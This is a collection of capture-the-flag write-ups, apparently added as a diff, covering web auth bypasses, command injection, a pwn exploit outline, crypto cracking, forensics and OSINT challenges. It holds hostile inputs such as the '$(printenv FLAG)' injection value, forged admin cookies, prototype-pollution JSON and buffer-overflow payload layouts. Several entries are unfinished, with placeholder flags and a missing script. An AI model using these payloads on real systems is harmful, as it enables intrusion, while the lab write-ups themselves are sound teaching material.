@@ -1,0 +1,929 @@
+CTF Writeup: API Gateway
+
+Challenge Name: API Gateway
+Category: Web / API Access Control
+Flag Format: MythX{...}
+
+Challenge Description
+
+A reverse proxy (nginx) performs role-based auth and forwards requests to backend API. Goal is to access admin endpoint by tampering with forwarded headers.
+
+
+
+Solution
+
+Step 1: Identify Endpoint
+
+- Start the lab and open API docs from web UI.
+- Endpoint discovered: GET /api/admin/flag.
+
+Step 2: Header Trust Check
+
+- Reverse proxy architecture suggests backend may trust headers such as X-Forwarded-Role.
+- Try spoofing role header to escalate privileges.
+
+Step 3: Exploit
+
+- Send request in Postman:
+  - GET /api/admin/flag
+  - Header: X-Forwarded-Role: admin
+
+- Backend accepted and returned admin response.
+
+Step 4: Flag Received
+
+Response JSON:
+
+json
+{
+  "flag": "ctf7{API_fate_way_cbfe713a}",
+  "message": "Welcome, administrator",
+  "status": "success"
+}
+
+
+- Extracted flag: ctf7{API_fate_way_cbfe713a}.
+
+
+
+Root Cause
+
+- Insecure trust of client-controlled forwarded role header.
+- Proxy-auth trust boundary not enforced, allowing direct spoofing.
+
+
+
+Tools Used
+
+- Browser + API docs
+- Postman
+
+Flag: ctf7{API_fate_way_cbfe713a}
+-----
+﻿Challenge Name: Argon2 Cracker
+Category: Cryptography / Hash Cracking
+Flag Format: (4-character uppercase alphanumeric)
+Challenge Description
+The challenge provided an Argon2id hash in PHC format:
+argon2id$v=19$m=65536,t=3,p=4$i/eOmAF+Qg40JHQAt4J/2A$sSPcLIMzrICGjBh3G5IcYZ
+A hint was also given:
+The password consists of uppercase letters (A–Z) and digits (0–9)
+Suggested using tools like hashcat
+Password length = 4 characters
+Solution
+Step 1: Analyze the Hash Format
+Identified the hash as Argon2id
+Observed:
+Incorrect character (O instead of 0)
+Missing base64 padding (==)
+Unusually short hash output (16 bytes instead of typical 32)
+Conclusion:
+Hash is valid cryptographically but malformed structurally
+Tools like Hashcat fail due to strict format requirements
+Step 2: Extract Raw Components
+Decoded base64 manually:
+Salt:
+8bf7b498017e420e34247400b7827fd8
+Hash:
+b123dc2e2333ac80868c18771b921c61
+These were used directly instead of relying on the broken PHC string.
+Step 3: Determine Search Space
+From hint:
+Charset = A–Z + 0–9
+Length = 4
+Total combinations:
+36^4 = 1,679,616
+Step 4: Generate Wordlist
+Created a complete wordlist:
+AAAA → ZZZZ
+0000 → 9999
+...
+Split into chunks (10k per file) to allow:
+parallel processing
+faster execution
+Step 5: Brute-force Locally
+Used Python with Argon2 raw hashing:
+from argon2.low_level import hash_secret_raw, Type
+result = hash_secret_raw(
+  secret=word.encode(),
+  salt=salt,
+  time_cost=3,
+  memory_cost=65536,
+  parallelism=4,
+  hash_len=16,
+  type=Type.ID
+)
+Compared each result with target hash.
+Step 6: Optimize Execution
+Ran on Google Cloud VM
+Used:
+wordlist chunking
+resumable script
+background execution
+Reduced runtime significantly.
+Step 7: Retrieve Password
+Script output:
+FOUND: UTF7
+This 4-character string is the flag.
+Root Cause
+Hash was intentionally malformed:
+invalid base64 encoding
+truncated hash length
+Prevented direct use of cracking tools
+Forced manual extraction and raw hashing
+The challenge tests:
+understanding of Argon2 internals
+ability to bypass tool limitations
+adapting approach when formats break
+Flag
+Retrieved via local brute-force after reconstructing hash
+Format: 4-character uppercase alphanumeric string
+Tools Used
+Python (argon2-cffi library)
+Google Cloud VM
+Custom scripts (wordlist generation, chunking, brute-force)
+Linux CLI tools (grep, crunch, nano)
+
+Flag: UTF7
+-----
+CTF Writeup: CookieAuth
+
+Challenge Name: CookieAuth
+Category: Web / Auth
+Flag Format: MythX{...}
+
+Challenge Description
+
+A web app stores authentication state in a cookie with an HMAC-like signature; source comments leak the server secret.
+
+
+
+Solution
+
+Step 1: Local Recon
+
+- Open the lab and load the app in a browser.
+- Inspect source HTML (Elements tab): comment reveals auth_secret=supersecretkey.
+
+Step 2: User Login and Cookie Recognition
+
+- Login as guest:
+  - username=guest, password=guest
+- In DevTools Application tab, observe cookie session_token value; this token encodes user identity and signature.
+
+Step 3: Craft Admin Cookie
+
+- Based on source hint, the signing algorithm is MD5.
+- Construct payload fields:
+  - username=admin
+  - role=admin
+- Compute signature (MD5 of supersecretkeyadminadmin): 0d8c2e6689872693269b13a38f9ad12b.
+
+- Build JSON token:
+
+json
+{"username": "admin", "role": "admin", "sig": "0d8c2e6689872693269b13a38f9ad12b"}
+
+
+- Base64-encode this JSON and set it as session_token cookie value.
+
+Step 4: Access Admin
+
+- Reload the app.
+- Visit /admin route (or link) now authorized as admin.
+- Extract flag from admin page.
+
+
+
+Flag
+
+- Flag obtained from admin panel after cookie forgery.
+- (Insert actual flag text here once verified.)
+
+
+
+Tools Used
+
+- Browser DevTools (Elements + Application)
+- CyberChef / md5 utility
+- Base64 encoder
+
+Flag: ????
+-----
+CTF Writeup: Dynasty
+
+Challenge Name: Dynasty
+Category: OSINT / Artifact Research
+Flag Format: MythX{...}
+
+Challenge Description
+
+The challenge provides a blurred image and description of an early civilization artifact with narrative scenes. The goal is to identify the artifact, its museum location, and its inventory number to construct the flag.
+
+
+
+Solution
+
+Step 1: Determine Artifact
+
+- Reverse image search and keyword queries for “early civilization artifact with narrative scenes knife”.
+- Identified as the Gebel el-Arak Knife (ivory + flint, ~3300 BCE).
+
+Artifact components:
+- gebel
+- el
+- arak
+- knife
+
+Step 2: Identify Museum
+
+- OSINT research indicates the knife currently resides in the Musée du Louvre, Paris.
+
+Museum components:
+- musee
+- du
+- louvre
+
+Step 3: Find Inventory Number
+
+- Louvre collection entry for Gebel el-Arak Knife shows inventory number E 11517.
+- Normalize for flag: e11517.
+
+Step 4: Construct Flag
+
+- Format: MythX{artifactpart1_artifactpart2_artifactpart3_artifactpart4_museumpart1_museumpart2_museumpart3_inventoryno}
+- Final:
+
+MythX{gebel_el_arak_knife_musee_du_louvre_e11517}
+
+
+
+Result
+
+- Flag derived: MythX{gebel_el_arak_knife_musee_du_louvre_e11517}.
+
+
+
+Tools Used
+
+- Reverse image search
+- Web search (OSINT)
+- Louvre collection database
+
+Flag: MythX{gebel_el_arak_knife_musee_du_louvre_e11517}
+-----
+CTF Writeup: Greeting
+
+Challenge Name: Greeting
+Category: Exploitation (Pwn)
+Flag Format: MythX{...}
+
+Challenge Description
+
+Remote service accepts input and has both format-string and buffer overflow vector in the same process. Goal is to leak stack canary, compute PIE base, and jump to secret function.
+
+
+
+Solution
+
+Step 1: Connect to Service
+
+- Open lab and identify host/port.
+- Connect via netcat: nc -v <host> <port>.
+
+Step 2: Leak Canary + PIE Using Format String
+
+- Use format string payload %9$p.%11$p to leak:
+  - Stack canary (first value)
+  - PIE address (second value)
+
+- This gives base address and enables bypassing stack protections.
+
+Step 3: Compute Target Addresses
+
+- PIE base calculation: pie_base = pie_leak - (pie_leak & 0xfff).
+- Secret function offset: SECRET_OFFSET = 0x269.
+- secret_func = pie_base + SECRET_OFFSET.
+- Return-gadget for alignment: ret_gadget = secret_func - 1.
+
+Step 4: Build Overflow Payload
+
+Use brute force to find correct buffer size (pad) and alignment:
+
+- Start with pad in 8..300 step 8.
+- For each pad, try both align=false/true.
+
+Payload structure:
+
+1. b'A' * pad_size
+2. p64(canary)
+3. b'\x00' * 8 (saved RBP)
+4. optional p64(ret_gadget) if do_align true
+5. p64(secret_func)
+
+Send this payload and read output for flag.
+
+
+
+Automation Script
+
+The full exploit script is below (as provided and used):
+
+py
+<the full script from the original markdown> 
+
+
+
+
+Result
+
+- Brute force found working (pad, align) combination.
+- Exploit triggered secret_func and returned flag.
+- Final flag output appeared in remote process response.
+
+
+
+Tools Used
+
+- Python + pwntools
+- nc for manual testing
+- Host/port from challenge environment
+
+Flag: ctf7{fmt_n_buffer_23_6aa65623}
+-----
+CTF Writeup: Header Hunter
+
+Challenge Name: Header Hunter
+Category: Web / API Discovery
+Flag Format: MythX{...}
+
+Challenge Description
+
+This challenge provides a web app and API docs, where a hidden API endpoint returns an internal token containing the flag.
+
+
+
+Solution
+
+Step 1: Start and Explore
+
+- Start the lab and open the web app.
+- Navigate to the API docs.
+
+Step 2: Extract curl Command
+
+- At the bottom of the home page/API docs, found a curl sample:
+
+
+curl -H "Accept: application/json" http://chall-132f7719.evt-246.glabs.ctf7.com/api/v1/healthcheck
+
+
+- Replace host placeholder with lab domain URL.
+
+Step 3: Retrieve Endpoint Response
+
+- Execute the curl command against the lab host.
+- The API returned JSON with an internal token containing flag data.
+
+
+
+Result
+
+- Flag extracted from JSON response (internal token).
+- (Insert actual flag here after verifying output.)
+
+
+
+Tools Used
+
+- Browser
+- curl
+
+Flag: ????
+-----
+CTF Writeup: JWT
+
+Challenge Name: JWT
+Category: Web / Auth
+Flag Format: MythX{...}
+
+Challenge Description
+
+A JWT-related challenge where the solution path involves using the lab URL in a provided exploit script to retrieve the flag.
+
+
+
+Solution
+
+Step 1: Get Lab URL
+
+- Open the challenge lab interface.
+- Extract the target URL for the service.
+
+Step 2: Update Exploit Script
+
+- Open main2.py in the repository.
+- Paste the lab URL into the appropriate variable or configuration section.
+
+Step 3: Run the Script
+
+- Execute main2.py.
+- The script communicates with the lab using the provided URL and retrieves the flag.
+
+
+
+Result
+
+- Flag is returned by the exploit script output.
+- (Add exact flag text here after retrieve.)
+
+
+
+Tools Used
+
+- Browser (lab URL discovery)
+- Python script (main2.py)
+
+Flag: ctf7{cant_guess_jwt_30ccd192}
+-----
+CTF Writeup: Ping Tool
+
+Challenge Name: Ping Tool
+Category: Web / Command Injection
+Flag Format: MythX{...}
+
+Challenge Description
+
+A web app allows users to input an IP address and executes ping <input>. A WAF blocks shell metacharacters like ;, &, |, but the objective is still to retrieve the flag.
+
+
+
+Solution
+
+Step 1: Reconnaissance
+
+- App input field: "Enter an IP address to ping".
+- Assumed backend uses:
+  - system("ping " + input)
+  - or /bin/sh -c "ping $input"
+
+Step 2: Test Injection Payloads
+
+- Common payloads blocked by WAF:
+  - 127.0.0.1;id
+  - 127.0.0.1 && id
+  - 127.0.0.1 | id
+
+- WAF likely blocks: ;, &, |.
+
+Step 3: Bypass via Command Substitution
+
+- Use shell substitution: $(command)
+- Test payload: 127.0.0.1$(id)
+
+- Server response:
+  - ping: groups=0(root): Name or service not known
+
+- Interpreted as command executed: ping 127.0.0.1uid=0(root) gid=0(root) groups=0(root).
+- Confirms command execution via $() substitution.
+
+Step 4: Locate Flag
+
+- Search for flag in common locations:
+  - /flag file
+  - environment variable FLAG
+
+- Enumerate env vars:
+  - 127.0.0.1$(env)
+- Response exposed environment variables (e.g., CTF7_97A27E6B_SVC_PORT_5000_TCP_PROTO=tcp).
+
+Step 5: Extract Flag
+
+- Payload: 127.0.0.1$(printenv FLAG)
+- If FLAG=ctf7{example_flag}:
+  - expanded as ping 127.0.0.1ctf7{example_flag}
+- Error output leaks flag:
+  - ping: 127.0.0.1ctf7{example_flag}: Name or service not known
+
+
+
+Final Payload
+
+- 127.0.0.1$(printenv FLAG)
+
+- This retrieves and leaks the flag via ping error output.
+
+Flag: ????
+-----
+CTF Writeup: ProfileHub
+
+Challenge Name: ProfileHub
+Category: Web / Object Injection
+Flag Format: MythX{...}
+
+Challenge Description
+
+A web app where profile data can be overridden via a JSON object. The app uses prototype-based authorisation checks, allowing privilege escalation through __proto__ pollution.
+
+
+
+Solution
+
+Step 1: Start Lab and Visit UI
+
+- Open lab URL in browser.
+- Find the profile editing / user data endpoint.
+
+Step 2: Prototype Override Payload
+
+- Construct an override object to pollute object prototype:
+
+json
+{
+  "__proto__": {
+    "isAdmin": true
+  }
+}
+
+
+- Send this payload to the profile/update endpoint.
+
+Step 3: Access Admin Panel
+
+- After setting the prototype override, visit admin panel link.
+- Permission check now sees isAdmin=true on objects, allowing access.
+- Flag is revealed on admin page.
+
+
+
+Root Cause
+
+- Insecure handling of untrusted JSON via object prototype modification.
+- Application logic trusts isAdmin property present through prototype chain.
+
+
+
+Flag
+
+- Retrieved from admin panel after prototype pollution.
+- (Insert exact flag value once confirmed.)
+
+
+
+Tools Used
+
+- Browser (lab UI)
+- API inspection / proxy (optional)
+
+Flag: ????
+-----
+CTF Writeup: RSA Common Factor
+
+Challenge Name: RSA Common Factor
+Category: Crypto / RSA
+Flag Format: MythX{...}
+
+Challenge Description
+
+Given two RSA public keys (n1, n2) and a ciphertext encrypted with the first key, recover the plaintext/flag. The keys are from a shared-generation environment, so shared prime factors are suspected.
+
+
+
+Solution
+
+Step 1: Analyze Provided Data
+
+- Two RSA modulus values (n1, n2) and public exponent e were provided.
+- Ciphertext c encrypted with public key 1.
+
+Step 2: Check for Weak Key Generation (GCD)
+
+- Compute g = gcd(n1, n2).
+- If g > 1 and < n1, then g is a shared prime factor (p).
+- This indicates both keys share p, which breaks RSA security.
+
+Step 3: Factor n1
+
+- p = g.
+- q = n1 // p.
+
+Step 4: Compute Private Key
+
+- Compute $(n1) = (p - 1)(q - 1)$.
+- Compute private exponent d = e^{-1} mod (n1).
+
+Step 5: Decrypt Ciphertext
+
+- Compute plaintext as m = pow(c, d, n1).
+- Decode the plaintext message to get flag text.
+
+
+
+Conclusion
+
+This challenge demonstrates the RSA common prime vulnerability. Shared factors between moduli allow recovery of private keys and decryption of ciphertexts. The flag is recovered once plaintext is decoded.
+
+
+
+Tools Used
+
+- Python (math and Crypto utilities)
+- GCD factoring via Python math.gcd
+- RSA decryption via modular exponentiation
+
+Flag: ????
+-----
+CTF Writeup: SourceDrive
+
+Challenge Name: SourceDrive
+Category: Web / Information Disclosure
+Flag Format: MythX{...}
+
+Challenge Description
+
+A frontend web app with hidden sensitive data in client-side assets. Challenge hints point to inspecting frontend resources instead of interactive exploitation.
+
+
+
+Solution
+
+Step 1: Initial Recon
+
+- Open the web app in browser.
+- Confirmed public UI has no obvious input fields or direct exploit vectors.
+- Hypothesis: secret exposed via frontend source rather than runtime behavior.
+
+Step 2: Page Source Inspection
+
+- Right-click → View Page Source.
+- Search HTML for comments, hidden fields, inline scripts.
+- No flag directly present in first pass.
+
+Step 3: Developer Tools + Sources
+
+- Open DevTools → Sources tab.
+- Identify loaded JS bundles: main.js, app.js, etc.
+- Modern SPA likely hides logic/data in minified code.
+
+Step 4: Analyze JavaScript Bundles
+
+- Pretty-print/minify bundles for readability.
+- Search within scripts for keywords:
+  - flag
+  - secret
+  - token
+  - key
+
+- Found hardcoded string matching expected flag format in one script.
+
+Step 5: Extract and Verify Flag
+
+- Directly extracted hardcoded flag text from JS source.
+- Confirmed this is the challenge flag.
+
+
+
+Key Insight
+
+Frontend assets are fully public. Sensitive data should never be shipped to clients. This challenge demonstrates that secret keys or flags in JS are trivially recoverable by attackers.
+
+
+
+Tools Used
+
+- Browser + DevTools
+- Source view and JS search
+- Code prettifier for minified bundles
+
+
+
+Flag
+
+- Retrieved directly from exposed JavaScript in the bundle.
+- (Insert exact flag value here after verification.)
+
+Flag: ????
+-----
+CTF Writeup: The Third Path
+
+Challenge Name: The Third Path
+Category: Forensics / Network Security
+Flag Format: MythX{...}
+
+Challenge Description
+
+We've captured a complete snapshot of a compromised analyst workstation, including a memory dump and the corresponding network traffic. Initial triage teams found ransomware artifacts and encrypted exfiltration streams, but none of the decrypted data makes sense.
+
+We believe they missed a highly advanced covert channel. Can you identify the subtle heartbeat bridging the network and RAM, bypassing the decoys to find the truth?
+
+---
+
+Solution
+
+Step 1: Memory & Network Triage
+
+We were provided with a memory dump (memory_IcOZWTs.dmp) and a PCAP file (capture_og0oXNg.pcap).
+
+- Memory Strings: A string search in the memory dump revealed a decoy flag: MythX{m3m0ry_r4ns0mw4r3_d3c0y}.
+- Encrypted Hint: We also found references to a password: Password is Rabb1tH0le123! and a path to payload.bin.
+- Network Activity: The PCAP showed an HTTP download of payload.bin from evil.com and 3,002 suspicious DNS queries directed at update.windows.com.
+
+---
+
+Step 2: Bypassing the Decoys
+
+Using the discovered password, we decrypted the payload.bin file using AES-CBC.
+
+Result: The file decrypted to another decoy: MythX{nice_try_but_keep_looking}. This confirmed the challenge description's warning about "bypassing the decoys."
+
+---
+
+Step 3: Finding the Hidden Info
+
+A deep binary scan of the 2MB memory dump revealed an embedded PNG image at offset 925702. Upon extraction, the image served as a technical hint:
+
+Feature: Message
+Info: Missing Data Info: 600x40 1-bit monochrome (8 aligned)
+
+Feature: Total Size
+Info: (600/8) * 40 = 3,000 bytes
+
+This indicated we needed to find exactly 3,000 bytes of data from a secondary source to reconstruct an image.
+
+---
+
+Step 4: Timing Analysis ("The Heartbeat")
+
+The "subtle heartbeat bridging the network and RAM" pointed to the DNS traffic. While the DNS packet payloads were identical, the timing intervals (deltas) between the 3,002 packets were not.
+
+We analyzed the packet timestamps using Python:
+
+1. Most deltas were exactly 8.09375 seconds.
+2. Deviations from this base interval were observed in exactly 3,001 instances.
+3. By quantizing the timing into units of 1/32nd of a second (delta * 32), we found that the deviations directly encoded byte values:
+   - Base Units = 8.09375 * 32 = 259
+   - Encoded Byte = 259 - (Packet Delta * 32)
+
+---
+
+Step 5: Reconstruction
+
+We extracted the 3,000 bytes from the DNS timing intervals and mapped them to a 1-bit monochrome bitmap of 600x40 pixels as specified by the internal memory hint.
+
+The resulting reconstructed image revealed the true flag written in text.
+
+---
+
+Step 6: Flag
+
+The real flag hidden in the timing covert channel was:
+
+MythX{c0v3rt_dn5_t1m1n6_n1ghtm4r3}
+
+---
+
+Tools Used
+
+- Python (Scapy): For precise PCAP timing extraction and analysis.
+- Python (PyCryptodome): For AES decryption of the decoy payloads.
+- Python (Pillow/zlib): To reconstruct the bitmap from the extracted timing bytes.
+- Strings / Binwalk: For initial memory dump inspection.
+
+Flag: MythX{c0v3rt_dn5_t1m1n6_n1ghtm4r3}
+-----
+CTF Writeup: Two-Point-ThreeSix
+
+Challenge Name: Two-Point-ThreeSix  
+Category: OSINT  
+Flag Format: MythX{JohnDoe_hhmm_hhmm_ddmmyyyy}
+
+##Challenge Description
+
+A recording survives. Listen carefully.
+
+Determine:
+
+- The name of the female voice (as identified in public records).
+- The real-world start and end time of the recording (IST).
+- The date on which the recording took place.
+
+
+
+##Solution
+
+###Step 1: Audio Analysis
+
+We began by analyzing the provided audio clip. The recording contained a tense exchange between a hostage and a terrorist handler during a high-profile attack. Key phrases and the nature of the dialogue allowed us to identify the source as a transcript from the 2008 Mumbai (26/11) terror attacks.
+
+By searching for specific keywords from the clip, we located the original news footage and public records of the intercepted phone calls.
+
+- Source: "26/11: Kasab giggles, terror on tape"
+- Reference: YouTube Link: https://www.youtube.com/watch?v=IIo0c16TPwg
+
+
+
+###Step 2: Identifying the Female Voice
+
+Within the intercepted recordings, the terrorist handler is heard forcing a female hostage to speak. Publicly available transcripts of the 26/11 investigations and the specific YouTube footage identify this hostage as Norma, one of the guests at the Taj Mahal Palace Hotel.
+
+
+
+###Step 3: Real-World Time Extraction (IST)
+
+In the identified footage (specifically around the 2:20 mark), an on-screen overlay provides the precise timing of the intercepted call as recorded by intelligence agencies:
+
+- Start Time: 16:50 IST → 1650
+- End Time: 17:01 IST → 1701
+
+
+
+###Step 4: Date Extraction
+
+The same public records and on-screen overlays verify the date of this specific intercepted conversation:
+
+- Date: November 27, 2008
+- Format (ddmmyyyy): 27112008
+
+
+
+###Step 5: Flag Construction
+
+Combining the extracted name, time range, and date into the required format:
+
+Flag:
+
+text
+MythX{Norma_1650_1701_27112008}
+
+
+
+
+##Tools Used
+
+- Audio Analysis: Manual listening and keyword extraction.
+- Google Search / OSINT: Locating public records of the 26/11 transcripts.
+- YouTube: Visual verification of time/date overlays in news archives.
+
+Flag: MythX{Norma_1650_1701_27112008}
+-----
+CTF Writeup: UserHub
+
+Challenge Name: UserHub
+Category: Web / API
+Flag Format: MythX{...}
+
+Challenge Description
+
+A user management REST API challenge where you can register, login, and view profile data. The admin panel is protected, but profile update behavior is vulnerable.
+
+
+
+Solution
+
+Step 1: Registration & Login
+
+- Open the lab in browser and locate the app UI.
+- Register a new user with:
+  - username: test
+  - password: test
+- Login via /api/login (e.g., using Postman) to obtain authentication token/session.
+
+Step 2: Profile API Exploration
+
+- Call /api/profile (GET) to inspect the returned JSON.
+- Found fields like email, role, etc.
+
+Step 3: Privilege Escalation via Profile Update
+
+- Send PUT request to /api/profile with JSON payload:
+
+json
+{
+  "email": "test",
+  "role": "admin"
+}
+
+
+- The endpoint accepts role updates and applies them directly (insecure authorization checks).
+
+Step 4: Access Admin Route
+
+- After profile edit, visit /admin page.
+- The admin route is now accessible, and the flag appears on the HTML page.
+
+
+
+Flag
+
+- Flag was retrieved from /admin after promoting role to admin.
+- (Insert actual flag text here once obtained.)
+
+
+
+Tools Used
+
+- Browser for registration/login flow.
+- Postman for API calls (/api/login, /api/profile).
+- HTTP debugger or proxy (optional) to inspect request/responses.
+
+Flag: ????
